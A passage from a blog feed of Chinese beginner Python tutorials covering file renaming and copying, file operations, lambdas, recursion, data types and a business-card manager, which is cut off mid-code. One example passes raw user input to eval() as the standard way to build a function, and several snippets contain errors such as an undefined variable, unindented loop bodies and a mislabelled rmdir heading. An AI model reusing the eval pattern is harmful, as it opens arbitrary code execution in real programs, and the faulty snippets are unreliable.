        <content type="html"><![CDATA[<p><img src="../do/images/tool/tree.png" alt></p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">#获取要重命名的文件夹名字</span><br><span class="line">folder_name =  input(&quot;请输入要重命名的文件夹:&quot;)</span><br><span class="line"></span><br><span class="line">#获取制定的文件夹中的所有文件名字</span><br><span class="line">file_names = os.listdir(folder_name)</span><br><span class="line"></span><br><span class="line">#切换到要重命名的文件夹下，所有命令都在这个目录下执行</span><br><span class="line">os.chdir(folder_name)</span><br><span class="line"></span><br><span class="line">#重命名</span><br><span class="line">print(&apos;当前文件名：&apos;)</span><br><span class="line">for name in file_names:</span><br><span class="line">    print(name)</span><br><span class="line">    os.rename(name, &apos;前缀-&apos;+name)</span><br><span class="line"></span><br><span class="line">print(&apos;重命名成功：&apos;)  </span><br><span class="line">file_names = os.listdir(&apos;./&apos;)</span><br><span class="line">for name in file_names:</span><br><span class="line">    print(name)</span><br></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">#1. 获取要重命名的文件夹 名字</span><br><span class="line">folder_name =  input(&quot;请输入要重命名的文件夹:&quot;)</span><br><span class="line"></span><br><span class="line">#2. 获取制定的文件夹中的所有 文件名字</span><br><span class="line">file_names = os.listdir(folder_name)</span><br><span class="line"></span><br><span class="line">#3. 重命名</span><br><span class="line">for name in file_names:</span><br><span class="line">    print(name)</span><br><span class="line">    old_file_name = folder_name+&quot;/&quot;+name</span><br><span class="line">    new_file_name = folder_name+&quot;/&quot;+&quot;[前缀]-&quot;+name</span><br><span class="line">    os.rename(old_file_name, new_file_name)</span><br></pre></td></tr></table></figure><h3 id="删除某一字符前所有字符串"><a href="#删除某一字符前所有字符串" class="headerlink" title="删除某一字符前所有字符串"></a>删除某一字符前所有字符串</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">#获取要重命名的文件夹名字</span><br><span class="line">folder_name =  input(&quot;请输入要重命名的文件夹:&quot;)</span><br><span class="line"></span><br><span class="line">#获取制定的文件夹中的所有文件名字</span><br><span class="line">file_names = os.listdir(folder_name)</span><br><span class="line"></span><br><span class="line">#切换到要重命名的文件夹下，所有命令都在这个目录下执行</span><br><span class="line">os.chdir(folder_name)</span><br><span class="line"></span><br><span class="line">#重命名</span><br><span class="line">for name in file_names:</span><br><span class="line">    add = name.rfind(&apos;-&apos;)+1</span><br><span class="line">    new_name = name[add:]</span><br><span class="line">    os.rename(name,new_name)</span><br><span class="line"></span><br><span class="line">print(&apos;重命名成功：&apos;)  </span><br><span class="line">file_names = os.listdir(&apos;./&apos;)</span><br><span class="line">for name in file_names:</span><br><span class="line">    print(name)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 文件写入复制重命名</title>
      <link href="/article/python-write-copy-cate.html"/>
      <url>/article/python-write-copy-cate.html</url>
      
        <content type="html"><![CDATA[<h3 id="文件复制"><a href="#文件复制" class="headerlink" title="文件复制"></a>文件复制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">#获取用户输入的文件名</span><br><span class="line">input_name = input(&apos;请输入要复制的文件名:&apos;)</span><br><span class="line"></span><br><span class="line">#打开要复制的文件</span><br><span class="line">old_file = open(input_name)</span><br><span class="line"></span><br><span class="line">#创建新文件</span><br><span class="line">nwe_file = open(&apos;text.txt&apos;,&apos;w&apos;)</span><br><span class="line"></span><br><span class="line">#读取文件写入到新文件</span><br><span class="line">content = old_file.read()</span><br><span class="line">nwe_file.write(content)</span><br><span class="line"></span><br><span class="line">#关闭文件</span><br><span class="line">old_file.close()</span><br><span class="line">nwe_file.close()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">#获取用户输入的文件名</span><br><span class="line">input_name = input(&apos;请输入要复制的文件名:&apos;)</span><br><span class="line"></span><br><span class="line">#打开要复制的文件</span><br><span class="line">old_file = open(input_name)</span><br><span class="line"></span><br><span class="line">#创建新文件</span><br><span class="line">#从右查找输入的文件名中的点,取0-option的字符串+复件+option的字符串到结尾的字符串</span><br><span class="line">option = input_name.rfind(&apos;.&apos;)</span><br><span class="line">new_file_name = input_name[0:option] + &apos;[复件]&apos; + input_name[option:]</span><br><span class="line">nwe_file = open(new_file_name,&apos;w&apos;)</span><br><span class="line"></span><br><span class="line">#读取文件写入到新文件</span><br><span class="line">content = old_file.read()</span><br><span class="line">nwe_file.write(content)</span><br><span class="line"></span><br><span class="line">#关闭文件</span><br><span class="line">old_file.close()</span><br><span class="line">nwe_file.close()</span><br></pre></td></tr></table></figure><h3 id="每次读取1024字节"><a href="#每次读取1024字节" class="headerlink" title="每次读取1024字节"></a>每次读取1024字节</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">#获取用户输入的文件名</span><br><span class="line">input_name = input(&apos;请输入要复制的文件名:&apos;)</span><br><span class="line"></span><br><span class="line">#打开要复制的文件</span><br><span class="line">old_file = open(input_name)</span><br><span class="line"></span><br><span class="line">#创建新文件</span><br><span class="line">#从右查找输入的文件名中的点,取0-option的字符串+复件+option的字符串到结尾的字符串</span><br><span class="line">option = input_name.rfind(&apos;.&apos;)</span><br><span class="line">new_file_name = input_name[0:option] + &apos;[复件]&apos; + input_name[option:]</span><br><span class="line">nwe_file = open(new_file_name,&apos;w&apos;)</span><br><span class="line"></span><br><span class="line">#读取文件写入到新文件</span><br><span class="line">while True:</span><br><span class="line">    content = old_file.read(1024)</span><br><span class="line">    if len(content) == 0:</span><br><span class="line">        break</span><br><span class="line">    nwe_file.write(content)</span><br><span class="line"></span><br><span class="line">#关闭文件</span><br><span class="line">old_file.close()</span><br><span class="line">nwe_file.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 文件的操作</title>
      <link href="/article/python-file-processing.html"/>
      <url>/article/python-file-processing.html</url>
      
        <content type="html"><![CDATA[<h3 id="读取文件操作："><a href="#读取文件操作：" class="headerlink" title="读取文件操作："></a>读取文件操作：</h3><p>read() 直接读取文件内容<br>readline() 读取文件的一行内容<br>readlines() 读取所有行，然后返回一个列表对象<br>a.seek(0) 文件定位读写，该函数表示光标返回开头<br>  a.seek(第一个参数（1:表示往后偏移1个字节），第二个参数（0:文件开头 1:当前操作的位置 2:文件末尾）)<br>a.tell() 获取当前文件读取的位置</p><h3 id="写入文件操作："><a href="#写入文件操作：" class="headerlink" title="写入文件操作："></a>写入文件操作：</h3><p>a.write() 写入<br>a.append 追加模式<br>binary 二进制方式进行处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = open(&quot;xxx.txt&quot;,&quot;w&quot;)</span><br><span class="line">#写入hahaha</span><br><span class="line">f.write(&quot;hahaha&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h3 id="文件的迭代："><a href="#文件的迭代：" class="headerlink" title="文件的迭代："></a>文件的迭代：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = open(&quot;crackcer.txt&quot;, &quot;r&quot;)</span><br><span class="line">for line in f:</span><br><span class="line">print line # 每次只读取和输出一行内容</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f = open(&quot;crackcer.txt&quot;, &quot;r&quot;)</span><br><span class="line">line = f.readlines() #整体的读取之后，赋值给变量line</span><br><span class="line">for line in info:</span><br><span class="line">print line</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">with open (&quot;test.log&quot;,&quot;r&quot;) as log:</span><br><span class="line">    logger = log.read()</span><br><span class="line">#打开文件时，会调用__enter__方法</span><br><span class="line">#关闭文件时，会调用__exit__方法</span><br><span class="line">#查看文章：http://localhost/320.html</span><br></pre></td></tr></table></figure><h3 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.rename(&apos;text.txt&apos;,&apos;test.txt&apos;)</span><br></pre></td></tr></table></figure><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.remove(&quot;text.txt&quot;)</span><br></pre></td></tr></table></figure><h3 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.mkdir(&quot;test&quot;)</span><br></pre></td></tr></table></figure><h3 id="创建文件夹-1"><a href="#创建文件夹-1" class="headerlink" title="创建文件夹"></a>创建文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.rmdir(&quot;test&quot;)</span><br></pre></td></tr></table></figure><h3 id="获取当前目录"><a href="#获取当前目录" class="headerlink" title="获取当前目录"></a>获取当前目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.getcwd()</span><br></pre></td></tr></table></figure><h3 id="改变默认目录"><a href="#改变默认目录" class="headerlink" title="改变默认目录"></a>改变默认目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.chdir(&quot;../&quot;)</span><br><span class="line">#所有命令都在上一级目录执行</span><br></pre></td></tr></table></figure><h3 id="获取当前目录列表"><a href="#获取当前目录列表" class="headerlink" title="获取当前目录列表"></a>获取当前目录列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.listdir(&quot;./&quot;)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">访问模式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">r</td><td align="left">以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td></tr><tr><td align="center">w</td><td align="left">打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。</td></tr><tr><td align="center">a</td><td align="left">打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="center">rb</td><td align="left">以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。</td></tr><tr><td align="center">wb</td><td align="left">以二进制格式打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。</td></tr><tr><td align="center">ab</td><td align="left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="center">r+</td><td align="left">打开一个文件用于读写。文件指针将会放在文件的开头。</td></tr><tr><td align="center">w+</td><td align="left">打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。</td></tr><tr><td align="center">a+</td><td align="left">打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td></tr><tr><td align="center">rb+</td><td align="left">以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。</td></tr><tr><td align="center">wb+</td><td align="left">以二进制格式打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。</td></tr><tr><td align="center">ab+</td><td align="left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 两个值交换</title>
      <link href="/article/python-value-exchange.html"/>
      <url>/article/python-value-exchange.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = 4</span><br><span class="line">b = 5</span><br><span class="line"></span><br><span class="line">#第1种</span><br><span class="line">c = 0</span><br><span class="line">c = a</span><br><span class="line">a = b</span><br><span class="line">b = c</span><br><span class="line"></span><br><span class="line">#第2种</span><br><span class="line">a = a+b</span><br><span class="line">b = a-b</span><br><span class="line">a = a-b</span><br><span class="line"></span><br><span class="line">#第3种</span><br><span class="line">a,b = b,a</span><br><span class="line"></span><br><span class="line">print(&quot;a=%d,b=%d&quot;%(a,b))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#a = 100</span><br><span class="line">a = [100]</span><br><span class="line"></span><br><span class="line">def test(num):</span><br><span class="line">    #num+=num#  +=表示 num指向谁就对谁进行修改,如果num指向[100],那么就变为[100,100]</span><br><span class="line">                #如果num 指向100,因为100是不可变类型,所以不能修改,所以num=num+num</span><br><span class="line">    num = num+num#===&gt;[100] + [100] ====&gt;[100,100]   注意只要是num=xxx一定是num指向了一个新的地方</span><br><span class="line">    print(num)</span><br><span class="line">    </span><br><span class="line">test(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 匿名函数</title>
      <link href="/article/python-anonymous-function.html"/>
      <url>/article/python-anonymous-function.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nums = [11,34234,23,344,123,1,23,124,523,4,12342341,423,43545]</span><br><span class="line">#从小到大排序</span><br><span class="line">nums.sort()</span><br><span class="line">print(nums)</span><br><span class="line"></span><br><span class="line">#从大到小排序</span><br><span class="line">nums.sort(reverse=True)</span><br><span class="line">print(nums)</span><br><span class="line"></span><br><span class="line">#倒序</span><br><span class="line">nums.reverse()</span><br><span class="line">print(nums)</span><br></pre></td></tr></table></figure><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">infors = [&#123;&quot;name&quot;:&quot;laowang&quot;,&quot;age&quot;:10&#125;,&#123;&quot;name&quot;:&quot;xiaoming&quot;,&quot;age&quot;:20&#125;,&#123;&quot;name&quot;:&quot;banzhang&quot;,&quot;age&quot;:10&#125;]</span><br><span class="line"></span><br><span class="line">#按照年龄进行排序</span><br><span class="line">infors.sort(key=lambda x:x[&apos;age&apos;])</span><br><span class="line">#key=lambda x:x[&apos;age&apos;] 对无法排序的字典或列表，使用匿名参数key=进行排序，要进行排序，必须要单个字典作为一个整体，并传递给第一个x,后边用x[&apos;age&apos;]，表示用age这个键进行排序</span><br><span class="line">print(infors)</span><br></pre></td></tr></table></figure><h3 id="匿名函数当做实参"><a href="#匿名函数当做实参" class="headerlink" title="匿名函数当做实参"></a>匿名函数当做实参</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def test(a,b,func):</span><br><span class="line">    result = func(a,b)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">num = test(11,22,lambda x,y:x+y)</span><br><span class="line">print(num)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def test(a,b,func):</span><br><span class="line">    result = func(a,b)</span><br><span class="line">    return result</span><br><span class="line">#python2中的方式</span><br><span class="line">#func_new = input(&quot;请输入一个匿名函数:&quot;)</span><br><span class="line"></span><br><span class="line">#python3中的方式,接收后为字符串，用eval转换成非字符串</span><br><span class="line">func_new = input(&quot;请输入一个匿名函数:&quot;)</span><br><span class="line">func_new = eval(func_new)</span><br><span class="line"></span><br><span class="line">num = test(11,22,func_new)</span><br><span class="line">print(num)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 递归</title>
      <link href="/article/python-recursion.html"/>
      <url>/article/python-recursion.html</url>
      
        <content type="html"><![CDATA[<p>4的阶乘：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i = 1</span><br><span class="line">result = 1</span><br><span class="line">while i&lt;=4:</span><br><span class="line">    result = result * i</span><br><span class="line">    i+=1</span><br></pre></td></tr></table></figure><p>函数实现，函数调用本身，相当于死循环：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def getNums(num):</span><br><span class="line">    if num&gt;1:</span><br><span class="line">        return num * getNums(num-1)</span><br><span class="line">    else:</span><br><span class="line">        return num</span><br><span class="line"></span><br><span class="line">result = getNums(4)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 数据类型</title>
      <link href="/article/python-data-type.html"/>
      <url>/article/python-data-type.html</url>
      
        <content type="html"><![CDATA[<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = 100</span><br><span class="line">b = a</span><br><span class="line">#100存在于内存中，a引用100，b=a后，b引用100。或者a、b标签贴在100上</span><br></pre></td></tr></table></figure><h3 id="值-value"><a href="#值-value" class="headerlink" title="值 value"></a>值 value</h3><p>就是我们应用的数据项。</p><p>Python不可变的数据类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int：整型</span><br><span class="line">str：字符串</span><br><span class="line">tuple：元祖</span><br></pre></td></tr></table></figure><p>Python可变的数据类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list：列表</span><br><span class="line">dict：字典</span><br></pre></td></tr></table></figure><h3 id="对象："><a href="#对象：" class="headerlink" title="对象："></a>对象：</h3><p>Python内部一切皆是对象，在Python中，数据会以对象的形式出现。</p><p>对象三个组成部分：</p><h3 id="身份-ID："><a href="#身份-ID：" class="headerlink" title="身份 ID："></a>身份 ID：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看对象的ID：id(a)</span><br><span class="line">每个对象都有自己唯一的身份标识，所有的对象都可以使用Python内置的方法ID（）来查询，ID的值就是这个对象在我们内存中的存储地址。</span><br></pre></td></tr></table></figure><h3 id="类型-type："><a href="#类型-type：" class="headerlink" title="类型 type："></a>类型 type：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查看对象的数据类型：type(a)</span><br><span class="line">str：字符串，&quot;&quot;表示。有很多字符串组合起来，连成的一串字符串。</span><br><span class="line">int：整型，没有小数部分的数字。</span><br><span class="line">list：列表，使用[]表示。</span><br><span class="line">typle：元祖，使用()表示。与列表想次，元祖不可修改，列表可修改。</span><br><span class="line">dict：字典，使用&#123;&#125;表示。Python里唯一一个映射关系的数据对象，具有可变性，是无序的。</span><br><span class="line">set：集合</span><br><span class="line">True、False：布尔值，真假值。</span><br><span class="line">Python对象都有它相应的数据类型，这个类型决定了这个对象可以保存什么样子的值，以及相对应的操作方法。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 函数改进名片管理</title>
      <link href="/article/python-function-application.html"/>
      <url>/article/python-function-application.html</url>
      
        <content type="html"><![CDATA[<p>使用函数实现名片管理：<br>每个功能一个代码块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">def menu():</span><br><span class="line">    print (&apos;名片管理系统 1.0&apos;)</span><br><span class="line">    print (&apos;1.添加一个名片&apos;)</span><br><span class="line">    print (&apos;2.删除一个名片&apos;)</span><br><span class="line">    print (&apos;3.修改一个名片&apos;)</span><br><span class="line">    print (&apos;4.查询一个名片&apos;)</span><br><span class="line">    print (&apos;5.列出所有名片&apos;)</span><br><span class="line">    print (&apos;6.退出系统&apos;)</span><br><span class="line">    print (&apos;7.删库跑路&apos;)</span><br><span class="line"></span><br><span class="line">def input_card():</span><br><span class="line">    name = input(&apos;请输入姓名：&apos;)</span><br><span class="line">    contact = input(&apos;请输入微信：&apos;)</span><br><span class="line">    phone = input(&apos;请输入电话：&apos;)</span><br><span class="line">    address = input(&apos;请输入地址：&apos;)</span><br><span class="line">    card = &#123;&#125;</span><br><span class="line">    card[&apos;name&apos;] = name</span><br><span class="line">    card[&apos;contact&apos;] = contact</span><br><span class="line">    card[&apos;phone&apos;] = phone</span><br><span class="line">    card[&apos;address&apos;] = address</span><br><span class="line">    return card</span><br><span class="line"></span><br><span class="line">def see_card(card_list):</span><br><span class="line">    print(&apos;名字\t微信\t电话\t地址&apos;)</span><br><span class="line">    for all_card in card_list:</span><br><span class="line">        print(&apos;%s\t%s\t%s\t%s&apos;%(all_card[&apos;name&apos;],all_card[&apos;contact&apos;],all_card[&apos;phone&apos;],all_card[&apos;address&apos;]))</span><br><span 